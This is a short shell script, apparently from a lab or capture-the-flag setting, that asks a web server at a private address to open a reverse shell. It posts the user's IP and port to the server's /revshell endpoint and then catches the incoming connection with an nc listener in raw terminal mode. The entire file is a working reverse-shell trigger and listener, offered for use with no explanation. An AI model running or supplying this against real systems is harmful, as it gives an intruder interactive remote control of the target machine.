export YOUR_IP="10.1.0.88"
export YOUR_PORT=9001
export SERVER="http://10.2.17.11:5000"

if ! which nc >/dev/null ; then
    echo You need nc
    exit 1
fi
if ! which curl >/dev/null ; then
    echo You need curl
    exit 1
fi

(sleep 1 ; curl $SERVER/revshell  -X POST -d '{"host":"'$YOUR_IP'","port":"'$YOUR_PORT'"}' -H 'content-type: application/json' -m1 2>/dev/null )  &

stty raw -echo ;  nc -l $YOUR_IP $YOUR_PORT ; stty cooked -echo
